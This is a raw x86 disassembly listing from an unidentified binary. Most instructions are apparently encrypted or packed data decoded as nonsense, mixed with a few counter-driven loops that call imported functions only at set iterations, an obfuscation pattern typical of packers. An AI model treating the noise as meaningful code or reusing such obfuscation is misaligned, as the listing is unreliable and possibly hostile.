  40ecb7:	adc    eax,0xaf341912
  40ecbc:	jbe    0x40ec8b
  40ecbe:	and    esp,0xffffff83
  40ecc1:	mov    edx,edi
  40ecc3:	jnp    0x40ecc0
  40ecc5:	push   ss
  40ecc6:	gs cmp eax,0xce6b0336
  40eccc:	and    eax,0x773e23ab
  40ecd1:	sar    BYTE PTR cs:[edx+0x2f],cl
  40ecd5:	jnp    0x40ecb2
  40ecd7:	popf   
  40ecd8:	jnp    0x40ed05
  40ecda:	test   eax,0x8b8f38dc
  40ecdf:	repz mov ecx,0x7eae8b73
  40ece5:	mov    ebx,0x8fbb5777
  40ecea:	addr16 loopne 0x40ec78
  40eced:	inc    ebp
  40ecee:	sbb    al,BYTE PTR [ebp-0xadaa8e0]
  40ecf4:	sbb    DWORD PTR [esi-0x7416e2da],ebx
  40ecfa:	aas    
  40ecfb:	mov    ah,0x34
  40ecfd:	cdq    
  40ecfe:	xlat   BYTE PTR ds:[ebx]
  40ecff:	mov    ch,bl
  40ed01:	or     DWORD PTR [edi],0xffffffbe
  40ed04:	sub    DWORD PTR [eax+eax*8-0x36],0x3f8a0eda
  40ed0c:	rol    dh,0xb1
  40ed0f:	je     0x40ed5e
  40ed11:	dec    ebx
  40ed12:	mov    esp,0x14f2e0b5
  40ed17:	repz push es
  40ed19:	cmp    DWORD PTR [ecx-0x34c0996a],edi
  40ed1f:	and    ch,BYTE PTR [ecx+eax*1-0x75905011]
  40ed26:	mov    ebx,?
  40ed28:	pushf  
  40ed29:	ss xchg esp,eax
  40ed2b:	mov    bh,0x18
  40ed2d:	adc    bh,BYTE PTR [esi-0x1e]
  40ed30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed31:	mov    ebp,0x2036202c
  40ed36:	add    cl,BYTE PTR [edi+edx*4-0x4e39be43]
  40ed3d:	loope  0x40ed20
  40ed3f:	cmp    dl,al
  40ed41:	mov    al,ds:0xfdc55252
  40ed46:	pop    es
  40ed47:	dec    ebx
  40ed48:	xor    al,0xc2
  40ed4a:	xchg   ecx,eax
  40ed4b:	add    bl,bl
  40ed4d:	sub    BYTE PTR [ebp+ecx*4-0xd],ah
  40ed51:	xor    ebx,DWORD PTR [eax+edx*8+0x26]
  40ed55:	out    dx,eax
  40ed56:	scas   eax,DWORD PTR es:[edi]
  40ed57:	adc    eax,0x16b1c59c
  40ed5c:	dec    ebx
  40ed5d:	loop   0x40ed6a
  40ed5f:	loop   0x40ece4
  40ed61:	sbb    dh,BYTE PTR [ebx+0x27]
  40ed64:	push   ebp
  40ed65:	(bad)  
  40ed67:	lea    edi,[ebx-0x3b]
  40ed6a:	mov    esi,0x6a75dd7d
  40ed6f:	(bad)  
  40ed70:	loop   0x40ed57
  40ed72:	and    ecx,eax
  40ed74:	cmp    BYTE PTR [ecx-0x21],0xb5
  40ed78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed79:	cmp    bl,0x51
  40ed7c:	loop   0x40ed67
  40ed7e:	outs   dx,BYTE PTR ds:[esi]
  40ed7f:	ret    0xe692
  40ed82:	push   esp
  40ed83:	and    bh,ch
  40ed85:	add    BYTE PTR [edi-0x63],al
  40ed88:	mov    WORD PTR [ecx+0x10bce043],fs
  40ed8e:	inc    esi
  40ed8f:	icebp  
  40ed90:	loopne 0x40eda9
  40ed92:	jmp    0x9d4540fb
  40ed97:	sbb    eax,0x2bc233fb
  40ed9c:	or     eax,0x4336d3
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x433753,0x18
  40edad:	cmp    DWORD PTR ds:0x433753,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x433753,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x433753
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x433753,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x35523cc2]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	in     eax,dx
  40ee77:	mov    esp,0x9c3601a2
  40ee7c:	adc    al,0xa5
  40ee7e:	jecxz  0x40eed2
  40ee80:	xor    BYTE PTR [eax+0x53],0x30
  40ee84:	jnp    0x40ee9e
  40ee86:	imul   edx,DWORD PTR [edi],0xffffffb2
  40ee89:	xlat   BYTE PTR ds:[ebx]
  40ee8a:	sti    
  40ee8b:	aas    
  40ee8c:	mov    ebx,0x443cce13
  40ee91:	adc    eax,0x69fb256d
  40ee96:	sub    bl,BYTE PTR [esp+eiz*2-0x4c]
  40ee9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee9b:	push   es
  40ee9c:	ja     0x40eef6
  40ee9e:	psubq  mm1,QWORD PTR [ebp+0x7bec504f]
  40eea5:	mov    dh,0xe6
  40eea7:	pop    ss
  40eea8:	imul   ebx,DWORD PTR [ebx-0x9705924],0xffffff8d
  40eeaf:	cmp    BYTE PTR [edi+ebp*4+0x7b],dl
  40eeb3:	dec    eax
  40eeb4:	inc    esp
  40eeb5:	aad    0xbb
  40eeb7:	cdq    
  40eeb8:	pop    esp
  40eeb9:	push   esp
  40eeba:	div    BYTE PTR [eax+0x4]
  40eebd:	xchg   edx,eax
  40eebe:	xor    DWORD PTR [ecx],edx
  40eec0:	dec    esp
  40eec1:	jae    0x40ef3e
  40eec3:	and    dh,BYTE PTR [ebx-0x7a]
  40eec6:	sub    DWORD PTR [esi+0x1],ebx
  40eec9:	add    BYTE PTR [eax],bl
  40eecb:	pop    esp
  40eecc:	nop
  40eecd:	ficom  WORD PTR [edi+ecx*4-0x4a5adcb9]
  40eed4:	test   DWORD PTR [ebx+0x6d0ddc45],0x7a687cc5
  40eede:	gs retf 
  40eee0:	jb     0x40ee80
  40eee2:	stos   BYTE PTR es:[edi],al
  40eee3:	je     0x40eec2
  40eee5:	push   esp
  40eee6:	jmp    DWORD PTR [eax-0x30a85bee]
  40eeec:	mov    bl,0x36
  40eeee:	and    ecx,esp
  40eef0:	inc    ecx
  40eef1:	cmp    DWORD PTR [eax-0x30],eax
  40eef4:	dec    edi
  40eef5:	mov    WORD PTR [eax+ebx*2+0x63970de2],es
  40eefc:	push   esi
  40eefd:	aaa    
  40eefe:	xor    al,0xe5
  40ef00:	popa   
  40ef01:	push   esi
  40ef02:	jne    0x40ef64
  40ef04:	loope  0x40ef5d
  40ef06:	sub    al,0x5f
  40ef08:	mov    edi,0xab51831f
  40ef0d:	and    DWORD PTR [edi-0x7e96012c],0x3d
  40ef14:	pop    ebx
  40ef15:	(bad)  
  40ef16:	js     0x40ef69
  40ef18:	fnstenv [edx]
  40ef1a:	ret    
  40ef1b:	xchg   edi,eax
  40ef1c:	aad    0xa2
  40ef1e:	push   eax
  40ef1f:	sbb    BYTE PTR [esi+ecx*8],0xc0
  40ef23:	cdq    
  40ef24:	dec    esp
  40ef25:	xor    BYTE PTR [edx-0x1a],ah
  40ef28:	lds    ecx,FWORD PTR [eax+0x356fb877]
  40ef2e:	cmp    al,0x69
  40ef30:	mov    WORD PTR [edi],ss
  40ef32:	loopne 0x40ef97
  40ef34:	xlat   BYTE PTR ds:[ebx]
  40ef35:	mov    ecx,0xa9b66f9
  40ef3a:	retf   0x52d1
  40ef3d:	xchg   esi,eax
  40ef3e:	lock jmp 0x166c1c7d
  40ef44:	imul   esi,DWORD PTR [ebx],0x2a3804d3
  40ef4a:	mov    bl,0x82
  40ef4c:	(bad)  
  40ef4e:	and    eax,0x8c63167c
  40ef53:	mov    ebp,0xb1ec4563
  40ef58:	out    dx,al
  40ef59:	iret   
  40ef5a:	adc    eax,0x2986c2c5
  40ef5f:	loopne 0x40ef78
  40ef61:	adc    al,ch
  40ef63:	adc    eax,0xa9f97858
  40ef68:	dec    ecx
  40ef69:	cmp    ecx,DWORD PTR [ecx]
  40ef6b:	repnz stos DWORD PTR es:[edi],eax
  40ef6d:	push   ebx
  40ef6e:	pop    esp
  40ef6f:	mov    ch,0x35
  40ef71:	xchg   edi,eax
  40ef72:	adc    ecx,DWORD PTR [eax+0x516f8160]
  40ef78:	mov    WORD PTR [esi],fs
  40ef7a:	addr16 xchg esi,eax
  40ef7c:	push   edx
  40ef7d:	ins    BYTE PTR es:[edi],dx
  40ef7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef7f:	(bad)  
  40ef80:	fsubr  QWORD PTR [ebx+0x47]
  40ef83:	jne    0x40ef2e
  40ef85:	xchg   DWORD PTR ds:0x83079184,eax
  40ef8b:	inc    ecx
  40ef8c:	and    DWORD PTR [edi+0x4c],edx
  40ef8f:	popf   
  40ef90:	pop    esi
  40ef91:	sar    DWORD PTR [ebp+ebx*8-0x53],cl
  40ef95:	iret   
  40ef96:	sub    al,0x7d
  40ef98:	push   ds
  40ef99:	xor    eax,0x791449b0
  40ef9e:	pushf  
  40ef9f:	aam    0x97
  40efa1:	and    DWORD PTR [ecx],edi
  40efa3:	jbe    0x40ef5a
  40efa5:	xor    ch,BYTE PTR [edi+ebp*2+0x6c1ba65a]
  40efac:	popf   
  40efad:	pop    ebp
  40efae:	add    DWORD PTR [esi-0x72666838],ecx
  40efb4:	push   ss
  40efb5:	fstp   QWORD PTR [eax+0x60]
  40efb8:	loopne 0x40f00f
  40efba:	xchg   DWORD PTR [ecx],ebp
  40efbc:	jo     0x40efdd
  40efbe:	dec    edi
  40efbf:	test   eax,0xff57aa0a
  40efc4:	arpl   WORD PTR [edi-0x7a52125],bx
  40efca:	jne    0x40f028
  40efcc:	stos   BYTE PTR es:[edi],al
  40efcd:	xlat   BYTE PTR ds:[ebx]
  40efce:	sbb    edi,DWORD PTR gs:[edx]
  40efd1:	pop    ebx
  40efd2:	sahf   
  40efd3:	xchg   esi,eax
  40efd4:	push   edi
  40efd5:	sub    DWORD PTR [eax+esi*8],edi
  40efd8:	and    eax,0x6d1d211c
  40efdd:	(bad)  
  40efde:	xor    al,0xd6
  40efe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efe1:	inc    ebp
  40efe2:	rcl    DWORD PTR [edx+0x22c082fe],cl
  40efe8:	cmc    
  40efe9:	call   0x2d1b20fc
  40efee:	repz jns 0x40f025
  40eff1:	leave  
  40eff2:	mov    ss,WORD PTR [edx+0x3ffc5dab]
  40eff8:	push   cs
  40eff9:	or     BYTE PTR [esi-0x4e],bh
  40effc:	add    edi,DWORD PTR [ebp+0x6d9ee138]
  40f002:	xchg   ebx,eax
  40f003:	xchg   ecx,eax
  40f004:	cli    
  40f005:	sar    dh,0x3e
  40f008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f009:	sub    al,0x4
  40f00b:	adc    BYTE PTR [edi+0x22],dh
  40f00e:	fadd   st(6),st
  40f010:	sub    edi,DWORD PTR [edx+edx*1]
  40f013:	xor    eax,0x2df5fceb
  40f018:	int3   
  40f019:	in     al,dx
  40f01a:	add    al,0x21
  40f01c:	xchg   esi,eax
  40f01d:	loop   0x40f033
  40f01f:	adc    al,0xcf
  40f021:	aam    0xf6
  40f023:	cwde   
  40f024:	cmp    BYTE PTR [edi+0xa],cl
  40f027:	adc    al,0x66
  40f029:	js     0x40efe5
  40f02b:	inc    sp
  40f02d:	inc    esp
  40f02e:	(bad)  
  40f02f:	outs   dx,BYTE PTR ss:[esi]
  40f031:	or     eax,0xeef9517b
  40f036:	aam    0x4a
  40f038:	xchg   ecx,eax
  40f039:	adc    bl,BYTE PTR [ebp+edi*8-0x3cebc9dd]
  40f040:	loop   0x40f07b
  40f042:	mov    al,cl
  40f044:	outs   dx,BYTE PTR ds:[esi]
  40f045:	sub    cl,BYTE PTR [edi-0x1a]
  40f048:	pop    es
  40f049:	jae    0x40f03e
  40f04b:	sub    ah,BYTE PTR [eax+eax*8-0x53]
  40f04f:	sbb    cl,BYTE PTR [ebx-0x36a1f3bb]
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43371b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x8ae81594,ebx
  40f076:	xor    BYTE PTR [edx-0x2a],cl
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	sub    al,0xe
  40f082:	adc    edx,DWORD PTR [edx-0x7fc88c1b]
  40f088:	jb     0x40f082
  40f08a:	sub    bl,BYTE PTR [edi+0x53f00b93]
  40f090:	(bad)  
  40f091:	xchg   esp,eax
  40f092:	mov    esp,DWORD PTR [edi-0x69]
  40f095:	mov    al,BYTE PTR [ecx-0x63bb67f4]
  40f09b:	mov    WORD PTR [eax],?
  40f09d:	bound  eax,QWORD PTR [edx+0x34]
  40f0a0:	stos   BYTE PTR es:[edi],al
  40f0a1:	or     eax,0xdd80fa86
  40f0a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0a7:	outs   dx,BYTE PTR ds:[esi]
  40f0a8:	int3   
  40f0a9:	imul   ebx,DWORD PTR [edx-0x1001d43e],0xfcc3b065
  40f0b3:	and    ecx,DWORD PTR [ebp*1+0x46396f7f]
  40f0ba:	mov    bh,0xa7
  40f0bc:	fimul  DWORD PTR [edx+ebp*2-0x176329ce]
  40f0c3:	inc    esp
  40f0c4:	fwait
  40f0c5:	lds    ebx,FWORD PTR [ecx]
  40f0c7:	jl     0x40f124
  40f0c9:	adc    eax,0x58c43c1d
  40f0ce:	dec    eax
  40f0cf:	push   ds
  40f0d0:	and    dh,BYTE PTR [edi-0x6d]
  40f0d3:	mov    ecx,0xf21136b2
  40f0d8:	mov    di,0xcf92
  40f0dc:	xor    DWORD PTR [esi],esp
  40f0de:	add    DWORD PTR [ecx],edx
  40f0e0:	push   ecx
  40f0e1:	lock frstor [ecx-0x7da0d1b9]
  40f0e8:	adc    cl,BYTE PTR [esi]
  40f0ea:	scas   al,BYTE PTR es:[edi]
  40f0eb:	pop    ss
  40f0ec:	sub    dh,BYTE PTR [ebp+ecx*1-0x3c208ea]
  40f0f3:	ins    DWORD PTR es:[edi],dx
  40f0f4:	cmp    eax,0x668000d8
  40f0f9:	(bad)
  40f0fc:	jmp    FWORD PTR [esi+ebx*1+0x638608ef]
  40f103:	ja     0x40f165
  40f105:	push   eax
  40f106:	ror    BYTE PTR [edi-0x37],0xeb
  40f10a:	ins    BYTE PTR es:[edi],dx
  40f10b:	int    0x1d
  40f10d:	jb     0x40f0be
  40f10f:	ret    0x762
  40f112:	xor    ebp,ebx
  40f114:	outs   dx,BYTE PTR ds:[esi]
  40f115:	std    
  40f116:	sub    al,0x34
  40f118:	push   esi
  40f119:	xor    BYTE PTR [ecx-0x17],bh
  40f11c:	iret   
  40f11d:	cs pop ds
  40f11f:	cs clc 
  40f121:	cmp    esp,DWORD PTR [edx+0x2c]
  40f124:	jmp    0x18764591
  40f129:	(bad)  
  40f12a:	cmp    edi,DWORD PTR [ecx+esi*8-0x57146bc6]
  40f131:	adc    ah,BYTE PTR [edx+0x6b]
  40f134:	and    DWORD PTR [ebx],eax
  40f136:	jp     0x40f18e
  40f138:	xlat   BYTE PTR ds:[ebx]
  40f139:	push   es
  40f13a:	adc    DWORD PTR [esi+0x4f077a75],edx
  40f140:	or     eax,0x4f59b288
  40f145:	mov    cl,0x67
  40f147:	sti    
  40f148:	inc    edi
  40f149:	(bad)  
  40f14a:	sub    cl,BYTE PTR [ebx]
  40f14c:	hlt    
  40f14d:	out    0x32,eax
  40f14f:	ja     0x40f105
  40f151:	clc    
  40f152:	lods   eax,DWORD PTR ds:[esi]
  40f153:	mov    fs,WORD PTR [edx]
  40f155:	cmp    BYTE PTR [ecx],dh
  40f157:	or     DWORD PTR [eax+0x6e],ecx
  40f15a:	cmp    edi,DWORD PTR [edx+0x1a]
  40f15d:	aaa    
  40f15e:	and    esp,esi
  40f160:	clc    
  40f161:	or     BYTE PTR [esp+esi*8-0x11a1a107],bl
  40f168:	(bad)  
  40f169:	in     eax,0xb6
  40f16b:	or     eax,0xbdb20fea
  40f170:	dec    eax
  40f171:	sub    esp,DWORD PTR [edx+edi*2-0x6fccc526]
  40f178:	mov    ebx,0x57db0f57
  40f17d:	ja     0x40f1d8
  40f17f:	ret    
  40f180:	nop
  40f181:	and    edi,esi
  40f183:	mov    eax,ds:0x3d6cdc83
  40f188:	arpl   WORD PTR [edx+0x39],bx
  40f18b:	fimul  WORD PTR [ebp+0x5f]
  40f18e:	add    eax,0x4bac518a
  40f193:	ret    
  40f194:	xor    BYTE PTR [ebx+0x3f6290ad],bh
  40f19a:	rol    DWORD PTR [ebx+eiz*4+0x59],1
  40f19e:	dec    ebp
  40f19f:	nop
  40f1a0:	mov    ebp,DWORD PTR ds:0xd12f8080
  40f1a6:	aam    0x58
  40f1a8:	xchg   BYTE PTR [esi+ebx*1+0x32],cl
  40f1ac:	arpl   WORD PTR [eax],bp
  40f1ae:	cwde   
  40f1af:	cmp    eax,DWORD PTR [edx-0x62]
  40f1b2:	cwde   
  40f1b3:	test   al,0x98
  40f1b5:	jecxz  0x40f1c5
  40f1b7:	and    dh,BYTE PTR [esi-0x3d]
  40f1ba:	in     al,0x49
  40f1bc:	aaa    
  40f1bd:	jg     0x40f14b
  40f1bf:	mov    ebx,0x60ed5e66
  40f1c4:	pop    edx
  40f1c5:	lahf   
  40f1c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1c7:	ins    DWORD PTR es:[edi],dx
  40f1c8:	inc    ebx
  40f1c9:	mov    ebx,0xbb454f98
  40f1ce:	push   eax
  40f1cf:	enter  0xfb87,0x74
  40f1d3:	setl   al
  40f1d6:	aam    0xea
  40f1d8:	adc    bh,dh
  40f1da:	or     edi,DWORD PTR [ebx]
  40f1dc:	jl     0x40f1bd
  40f1de:	sbb    al,0xc5
  40f1e0:	add    al,0x99
  40f1e2:	sbb    BYTE PTR [ebx-0x780beab9],al
  40f1e8:	cmp    al,0x19
  40f1ea:	jmp    0x40f1d6
  40f1ec:	mov    dh,0xfb
  40f1ee:	xchg   ebp,eax
  40f1ef:	jge    0x40f24a
  40f1f1:	inc    ebp
  40f1f2:	xor    esi,DWORD PTR [edx-0xe501e27]
  40f1f8:	xchg   edi,eax
  40f1f9:	cmp    edx,edi
  40f1fb:	mov    dl,0x4f
  40f1fd:	sar    BYTE PTR [ebx],cl
  40f1ff:	fst    st(2)
  40f201:	fist   DWORD PTR [esi+0x25b3530f]
  40f207:	lds    edi,FWORD PTR [ecx-0x5dea028b]
  40f20d:	popa   
  40f20e:	dec    esp
  40f20f:	add    al,0x44
  40f211:	sub    BYTE PTR [ecx],0x73
  40f214:	mov    ecx,0x4cdde373
  40f219:	shl    dl,cl
  40f21b:	xchg   esp,eax
  40f21c:	pushf  
  40f21d:	aad    0xc6
  40f21f:	mov    eax,ds:0xdb368878
  40f224:	lea    edi,[ebp+0xe]
  40f227:	mov    dl,0x6d
  40f229:	fstp   st(6)
  40f22b:	mov    BYTE PTR [ebx+0x240a37e],ch
  40f231:	pop    ebx
  40f232:	aaa    
  40f233:	rcr    bl,0xb3
  40f236:	sahf   
  40f237:	push   esi
  40f238:	sub    eax,0xdcd53d04
  40f23d:	dec    ebp
  40f23e:	xor    bh,cl
  40f240:	jb     0x40f1fd
  40f242:	mov    al,ds:0xc3665c8a
  40f247:	xchg   DWORD PTR [esi+esi*2-0x2bf6bad0],eax
  40f24e:	lods   eax,DWORD PTR ds:[esi]
  40f24f:	rcl    BYTE PTR [edi+0x4],0x36
  40f253:	(bad)  
  40f254:	jns    0x40f2c4
  40f256:	in     al,dx
  40f257:	inc    esi
  40f258:	cld    
  40f259:	gs pusha 
  40f25b:	adc    al,0x5f
  40f25d:	dec    esp
  40f25e:	cmp    bl,BYTE PTR [esi+0x2380b386]
  40f264:	ds stc 
  40f266:	push   es
  40f267:	test   DWORD PTR [edx],ecx
  40f269:	imul   esi,DWORD PTR [ebx+ecx*2],0x31209151
  40f270:	mov    ebp,0x14c43475
  40f275:	retf   0x7a9e
  40f278:	pop    ebp
  40f279:	mov    ds,WORD PTR [edx]
  40f27b:	and    al,0x45
  40f27d:	or     al,BYTE PTR [edi-0x4f]
  40f280:	nop
  40f281:	lods   eax,DWORD PTR ds:[esi]
  40f282:	and    DWORD PTR [edi-0x4e4be12d],ecx
  40f288:	push   0x4a
  40f28a:	pop    ecx
  40f28b:	and    eax,0x36885b40
  40f290:	repz and eax,0x3277081b
  40f296:	xor    DWORD PTR [ebx-0x2e0f6072],esi
  40f29c:	pop    eax
  40f29d:	cmc    
  40f29e:	and    BYTE PTR [eax],0x29
  40f2a1:	cmp    DWORD PTR [esi],eax
  40f2a3:	cdq    
  40f2a4:	(bad)  
  40f2a5:	repnz fbstp TBYTE PTR [eax-0x5f]
  40f2a9:	mov    bh,0xb3
  40f2ab:	jno    0x40f2b6
  40f2ad:	cmp    al,0x7b
  40f2af:	mov    ds:0xb846c3a2,al
  40f2b4:	xchg   esp,eax
  40f2b5:	dec    ebx
  40f2b6:	push   eax
  40f2b7:	cli    
  40f2b8:	push   ss
  40f2b9:	lods   eax,DWORD PTR ds:[esi]
  40f2ba:	pop    es
  40f2bb:	dec    edx
  40f2bc:	xchg   esi,eax
  40f2bd:	xchg   ecx,eax
  40f2be:	inc    esi
  40f2bf:	pushf  
  40f2c0:	mov    ebp,0x1c64d1e4
  40f2c5:	push   esp
  40f2c6:	cmc    
  40f2c7:	mov    edi,gs
  40f2c9:	icebp  
  40f2ca:	push   edi
  40f2cb:	xor    al,0xc0
  40f2cd:	cmp    BYTE PTR [edi+0xb],cl
  40f2d0:	push   cs
  40f2d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2d2:	lea    eax,[esi+0x129b6f28]
  40f2d8:	and    bl,BYTE PTR [edi-0x5d5459a0]
  40f2de:	or     al,0x25
  40f2e0:	cmp    esi,edx
  40f2e2:	push   ebp
  40f2e3:	cmp    DWORD PTR [ebx+0x42f8d55c],edi
  40f2e9:	ins    DWORD PTR es:[edi],dx
  40f2ea:	and    BYTE PTR [ebp-0x2f],dl
  40f2ed:	cmp    al,0x75
  40f2ef:	add    al,0xb7
  40f2f1:	out    dx,al
  40f2f2:	adc    al,0x61
  40f2f4:	popa   
  40f2f5:	xchg   ebx,eax
  40f2f6:	mov    eax,ds:0xa6a99654
  40f2fb:	jae    0x40f2e3
  40f2fd:	or     edx,DWORD PTR ds:0xe64ff6b0
  40f303:	xlat   BYTE PTR ds:[ebx]
  40f304:	cmp    eax,0xf1ff99d6
  40f309:	mov    DWORD PTR [eax],edx
  40f30b:	xor    al,0x35
  40f30d:	shl    DWORD PTR ds:0x930c0a0a,cl
  40f313:	pop    edi
  40f314:	or     al,0xd6
  40f316:	add    edx,DWORD PTR [edx]
  40f318:	in     eax,0x99
  40f31a:	push   esi
  40f31b:	mov    edx,0xa7ddf74c
  40f320:	xchg   edx,eax
  40f321:	sbb    esi,DWORD PTR [esi+0x29f47867]
  40f327:	sbb    al,0xd5
  40f329:	jo     0x40f398
  40f32b:	mov    cl,0x3d
  40f32d:	repnz inc esp
  40f32f:	in     al,dx
  40f330:	add    ecx,edx
  40f332:	dec    edi
  40f333:	out    dx,al
  40f334:	jne    0x40f36b
  40f336:	(bad)  
  40f337:	jno    0x40f39a
  40f339:	test   DWORD PTR [ecx+eax*2-0x63],ebp
  40f33d:	je     0x40f325
  40f33f:	dec    ecx
  40f340:	xchg   esi,eax
  40f341:	lods   al,BYTE PTR ds:[esi]
  40f342:	lods   al,BYTE PTR ds:[esi]
  40f343:	cli    
  40f344:	aaa    
  40f345:	out    dx,eax
  40f346:	mov    esp,0xfe8c4073
  40f34b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f34c:	ds or  eax,0x93b1f49f
  40f352:	xlat   BYTE PTR ds:[ebx]
  40f353:	fwait
  40f354:	inc    esi
  40f355:	cmp    al,BYTE PTR [eax+ecx*2-0x45ab2792]
  40f35c:	bound  esi,QWORD PTR [esi-0x2a]
  40f35f:	sbb    ecx,ebp
  40f361:	mov    edi,0xedd40e76
  40f366:	pusha  
  40f367:	outs   dx,BYTE PTR ds:[esi]
  40f369:	mov    al,0x52
  40f36b:	sub    BYTE PTR [esi+0x6a],0xee
  40f36f:	mov    edi,DWORD PTR [edi+ebx*4]
  40f372:	ins    BYTE PTR es:[edi],dx
  40f373:	repnz lods eax,DWORD PTR ds:[esi]
  40f375:	aam    0x5
  40f377:	out    dx,al
  40f378:	(bad)  
  40f379:	adc    al,0x13
  40f37b:	stc    
  40f37c:	(bad)  
  40f37d:	fisub  WORD PTR [edx]
  40f37f:	and    bh,ah
  40f381:	adc    bh,BYTE PTR [eax-0x7637acf]
  40f387:	and    DWORD PTR ds:0x4337a7,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x4337a7
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x4337a7,ecx
  40f3a0:	cmp    DWORD PTR ds:0x4337a7,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x4337a7,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x4337a7
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x4337a7,ecx
  40f3d0:	cmp    DWORD PTR ds:0x4337a7,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x4336ab
  40f3e3:	mov    ecx,DWORD PTR ds:0x433783
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x4336d7,0x13
  40f3fb:	cmp    DWORD PTR ds:0x4336d7,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x4336d7,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x4336d7
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x4336d7,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x43376f,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x43376f
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x43376f,ecx
  40f444:	cmp    DWORD PTR ds:0x43376f,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x43376f,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x43376f
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x43376f,ecx
  40f474:	cmp    DWORD PTR ds:0x43376f,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x43375b,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x43375b
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x43375b,edx
  40f498:	cmp    DWORD PTR ds:0x43375b,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433911
  40f4af:	push   0x433967
  40f4b4:	push   0x43394b
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x43375b,0x19
